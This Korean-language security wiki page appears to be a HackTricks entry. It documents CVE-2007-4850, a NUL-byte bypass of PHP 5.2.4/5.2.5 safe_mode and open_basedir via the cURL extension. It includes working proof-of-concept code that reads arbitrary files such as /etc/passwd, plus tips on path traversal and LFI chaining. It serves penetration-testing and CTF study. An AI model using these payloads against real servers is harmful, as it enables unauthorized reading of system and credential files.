# PHP 5.2.4 및 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

이 페이지는 특정 PHP 5.2.x 빌드에서 cURL 확장을 이용해 PHP safe_mode/open_basedir 검사를 우회하는, 레거시이지만 CTFs나 로컬 레거시 설치에서 여전히 유용한 트릭을 문서화합니다.

- 영향 대상: PHP 5.2.4 및 5.2.5 (ext/curl 활성화됨).
- 영향: safe_mode 또는 open_basedir 제한에도 불구하고 임의의 로컬 파일을 읽을 수 있음 (직접적인 코드 실행은 아님).
- ID: CVE-2007-4850.

출처: http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## 원라이너 PoC

safe_mode 또는 open_basedir가 활성화되어 있고 cURL이 활성화된 경우, 다음은 현재 스크립트의 내용을 반환합니다:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## 더 명확한 PoC (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
노트:
- 큰따옴표 또는 chr(0)을 사용해 실제 NUL-byte를 주입하세요. Percent-encoding (%00)은 신뢰성 있게 동작하지 않습니다.
- 이것은 파일 읽기 프리미티브입니다. 가능한 경우 추가 권한 상승을 위해 다른 프리미티브(log poisoning, session file inclusion 등)와 결합하세요.

## 왜 이게 동작하는가 (요약)

취약점은 PHP 5.2.4/5.2.5가 ext/curl에서 file:// URL에 대해 safe_mode/open_basedir 검사를 수행하는 방식에 있습니다. 검사 과정에서 URL을 파싱하고 경로 구성요소를 검증했지만, NUL-byte 처리로 인해 검증기는 libcurl에서 실제로 사용한 문자열과 다른 문자열을 검증했습니다. 실무에서는 검증기가 NUL 이후의 경로를 승인할 수 있는 반면, libcurl은 NUL 이전 부분을 URL 컨테이너로 사용하여 NUL 바이트 뒤에 놓인 파일을 읽도록 허용하는 우회가 발생했습니다. 자세한 내용은 원본 분석과 curl/interface.c의 영향을 받는 매크로를 확인하세요. [CVE-2007-4850].

## 제약 및 수정사항

- ext/curl의 파싱/검증을 수정하여 이후의 5.2.x(예: 배포판에서 5.2.6으로 패치된 빌드)에서 수정되었습니다.
- 매우 오래된 PHP 배포에만 영향을 미칩니다; safe_mode는 PHP 5.4에서 제거되었고 최신 빌드에서는 이 동작이 없습니다.

## 관련된 역사적 cURL 기반 우회

- CVE-2006-2563 (PHP 4.4.2/5.1.4): libcurl wrappers가 임베디드 NUL로 `file://` 접근을 허용해 open_basedir를 우회할 수 있었음; 5.2.x 이전에 수정됨.
- PHP bugs #30609/#36223는 정규화 없이 `file://`을 사용한 초기 cURL open_basedir 문제를 추적했습니다. NUL byte 이전에서의 검사나 `realpath`-스타일 해상도가 없는 모든 검사는 동일한 절단(truncation)에 취약합니다.

## CTF 팁

- ext/curl이 로드된 PHP 5.2.4/5.2.5를 식별할 때(`phpinfo()`에서 `cURL support => enabled` 및 정확한 `PHP Version`을 확인), 이 기법은 `allow_url_fopen`이 비활성화되어 있어도 일반적으로 동작합니다. 이는 ext/curl이 `file://`을 자체적으로 처리하기 때문입니다.
- 직접 경로가 차단되면 NUL 이후에 상대 경로 횡단을 시도하세요. 예: `file://x\x00../../../../etc/passwd`. 횡단은 open_basedir 가드가 아니라 libcurl에 의해 해석됩니다.
- 취약한 서버측 코드가 사용자 제어 URL을 `curl_exec()`로 그대로 반영하는 경우(레거시 SSRF 유사 엔드포인트에서 흔함), 페이로드를 단일 HTTP 요청 바디에 감싸 LFI를 유발할 수 있습니다.

## 참조

Other disable_functions/open_basedir bypasses and modern techniques are collected here:

{{#ref}}
README.md
{{#endref}}

## References

- [Ubuntu CVE entry with patch pointers and affected versions](https://ubuntu.com/security/CVE-2007-4850)
- [Technical writeup with code context (cxsecurity)](http://cxsecurity.com/issue/WLB-2008010060)
- [PHP bug #36223 (curl bypasses open_basedir)](https://bugs.php.net/bug.php?id=36223)
- [CVE-2006-2563 cURL PHP File Access Bypass (earlier NUL-byte issue)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2563)
{{#include ../../../../banners/hacktricks-training.md}}
